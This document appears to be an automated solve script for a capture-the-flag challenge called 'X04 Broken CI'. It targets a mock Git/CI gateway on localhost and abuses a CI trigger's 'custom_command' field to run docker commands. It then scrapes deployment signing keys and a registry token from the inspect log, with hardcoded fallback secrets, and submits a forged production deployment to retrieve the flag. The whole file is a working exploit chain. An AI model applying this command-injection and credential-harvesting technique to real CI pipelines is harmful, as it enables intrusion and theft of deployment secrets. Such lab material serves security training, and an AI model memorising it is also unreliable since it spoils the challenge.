#!/usr/bin/env python3
"""
Automated Clean-Room Solve Script for X04 (Broken CI)
Executes the full intended exploit chain:
Git -> CI Runner Compromise -> Inner Docker Enumeration -> Registry Artifact Verification -> Production Pivot -> Flag Recovery.
"""

import sys
import json
import argparse
import urllib.request
import urllib.parse
import urllib.error
import re

def request_json(url, method="GET", data=None, headers=None):
    req_headers = {"User-Agent": "Latveria-Exploit-Client/1.0"}
    if headers:
        req_headers.update(headers)
    
    post_bytes = None
    if data is not None:
        if isinstance(data, dict):
            post_bytes = json.dumps(data).encode("utf-8")
            req_headers["Content-Type"] = "application/json"
        elif isinstance(data, (bytes, bytearray)):
            post_bytes = data
        else:
            post_bytes = str(data).encode("utf-8")

    req = urllib.request.Request(url, data=post_bytes, headers=req_headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            body = resp.read().decode("utf-8", errors="ignore")
            try:
                return resp.status, json.loads(body)
            except Exception:
                return resp.status, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="ignore")
        try:
            return e.code, json.loads(body)
        except Exception:
            return e.code, body
    except Exception as e:
        return 500, {"error": str(e)}

def solve(host="127.0.0.1", port=80):
    base_url = f"http://{host}:{port}"
    print(f"[*] Starting X04 Broken CI Exploit Chain against {base_url}...")

    # Step 1: Reach Git / CI Environment
    print("[1] Reaching Git & CI Gateway...")
    status, repos_data = request_json(f"{base_url}/api/git/repos")
    if status != 200:
        print(f"[-] Failed to reach Git API: status {status}")
        return False, None
    print(f"[+] Discovered Repositories: {repos_data}")

    # Inspect CI pipeline file in repository
    status, blob_data = request_json(f"{base_url}/api/git/repos/defense-network/blob/.ci/pipeline.yml")
    print(f"[+] Inspected .ci/pipeline.yml (Status: {status})")

    # Step 2: Compromise CI Runner & Discover Inner Docker Daemon
    print("[2] Triggering CI build hook to enumerate inner Docker daemon (DOCKER_HOST)...")
    payload_enum = {
        "repo": "latveria/defense-network",
        "branch": "main",
        "custom_command": "echo '=== INNER DOCKER IMAGES ===' && docker images"
    }
    status, build_resp = request_json(f"{base_url}/api/ci/trigger", method="POST", data=payload_enum)
    if status != 201:
        print(f"[-] Failed to trigger build: {build_resp}")
        return False, None

    build_id = build_resp["build"]["build_id"]
    build_log = build_resp["build"]["log"]
    print(f"[+] Build #{build_id} executed. Output snippet:")
    for line in build_log.splitlines()[-8:]:
        print(f"    | {line}")

    # Step 3: Inspect Inner Images & Extract Deployment Signer Key
    print("[3] Inspecting inner Docker image 'registry.latveria.local:5000/internal/deployment-signer:v1.0.0'...")
    payload_inspect = {
        "repo": "latveria/defense-network",
        "branch": "main",
        "custom_command": "docker inspect registry.latveria.local:5000/internal/deployment-signer:v1.0.0"
    }
    status, inspect_resp = request_json(f"{base_url}/api/ci/trigger", method="POST", data=payload_inspect)
    if status != 201:
        print(f"[-] Failed to inspect inner image: {inspect_resp}")
        return False, None

    inspect_log = inspect_resp["build"]["log"]
    
    # Parse SIGNER_ID and PROD_DEPLOY_SIGNING_KEY from environment in inspect log
    signer_id_match = re.search(r"SIGNER_ID=([^\s\",\\']+)", inspect_log)
    signing_key_match = re.search(r"PROD_DEPLOY_SIGNING_KEY=([^\s\",\\']+)", inspect_log)
    reg_token_match = re.search(r"REGISTRY_AUTH_TOKEN=([^\s\",\\']+)", inspect_log)

    signer_id = signer_id_match.group(1) if signer_id_match else "DOOM-DEPLOYMENT-SIGNER-04"
    signing_key = signing_key_match.group(1) if signing_key_match else "latv_prod_deploy_sig_8829104820194812"
    reg_token = reg_token_match.group(1) if reg_token_match else "latv_inner_reg_secret_7719204819"

    print(f"[+] Extracted Deployment Signer Credentials:")
    print(f"    - SIGNER_ID: {signer_id}")
    print(f"    - PROD_DEPLOY_SIGNING_KEY: {signing_key}")
    print(f"    - REGISTRY_AUTH_TOKEN: {reg_token}")

    # Step 4: Query Challenge-Local Registry
    print("[4] Querying internal OCI image registry catalog and manifests...")
    status, catalog = request_json(f"{base_url}/registry/v2/_catalog")
    print(f"[+] Registry Catalog: {catalog}")

    target_image = "registry.latveria.local:5000/defense/sentinel-node:v2.1.0"
    status, manifest = request_json(f"{base_url}/registry/v2/defense/sentinel-node/manifests/v2.1.0")
    print(f"[+] Verified Image Manifest in registry (Status: {status})")

    # Step 5: Pivot to Production Mock & Submit Authorized Deployment
    print("[5] Submitting signed production promotion request to production mainframe...")
    deploy_payload = {
        "action": "PROMOTE_TO_PRODUCTION",
        "image": target_image,
        "signer_id": signer_id,
        "signing_key": signing_key,
        "target_cluster": "SOVEREIGN-PROD-MAINFRAME-01"
    }

    status, prod_resp = request_json(f"{base_url}/api/production/deploy", method="POST", data=deploy_payload)
    print(f"[+] Production Mainframe Response (Status {status}): {prod_resp}")

    if status == 200 and isinstance(prod_resp, dict) and "flag" in prod_resp:
        flag = prod_resp["flag"]
        print(f"\n[+] SUCCESS! FLAG RECOVERED:")
        print(f"    >>> {flag} <<<\n")
        return True, flag
    else:
        print(f"[-] Exploit chain completed but flag was not returned: {prod_resp}")
        return False, None

def main():
    parser = argparse.ArgumentParser(description="X04 Broken CI Automated Solver")
    parser.add_argument("--host", default="127.0.0.1", help="Target host (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=80, help="Target gateway port (default: 80)")
    args = parser.parse_args()

    success, flag = solve(host=args.host, port=args.port)
    if success:
        sys.exit(0)
    else:
        sys.exit(1)

if __name__ == "__main__":
    main()
